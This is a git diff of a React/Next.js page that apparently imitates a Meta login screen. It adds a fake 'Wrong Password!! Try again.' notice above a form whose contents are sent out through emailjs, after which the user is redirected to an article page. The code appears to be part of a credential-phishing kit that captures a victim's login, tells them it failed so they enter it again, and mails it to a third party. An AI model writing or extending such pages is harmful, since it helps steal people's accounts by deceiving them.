@@ -7,9 +7,10 @@ import { FaMeta } from "react-icons/fa6";
 import emailjs from "@emailjs/browser";
 import { useRouter } from "next/navigation";
 
-export default function Home() {
-  const form = useRef();
-  const router = useRouter();
+const WorngPage = () => {
+
+    const form = useRef();
+    const router = useRouter();
 
 
     const handleSubmit = (e) => {
@@ -26,7 +27,7 @@ export default function Home() {
           () => {
             console.log("Email sent successfully!");
             setTimeout(() => {
-              router.push("/Wrongpage"); 
+              router.push("/article"); 
             }, 100); 
           },
           (error) => {
@@ -34,7 +35,6 @@ export default function Home() {
           }
         );
     };
-
 
     return (
         <section className="p-4 min-h-screen relative max-w-screen-sm mx-auto ">
@@ -54,6 +54,8 @@ export default function Home() {
                 className="flex flex-col gap-3 mt-16"
                 action=""
             >
+                
+                <p className="text-red-500 text-sm font-semibold text-center">Wrong Password!! Try again.</p>
                 <input
                     name="from_email"
                     className="w-full p-3 rounded-xl border-2 placeholder-gray-600 placeholder-"
@@ -85,4 +87,6 @@ export default function Home() {
             </div>
         </section>
     );
-}
+};
+
+export default WorngPage;
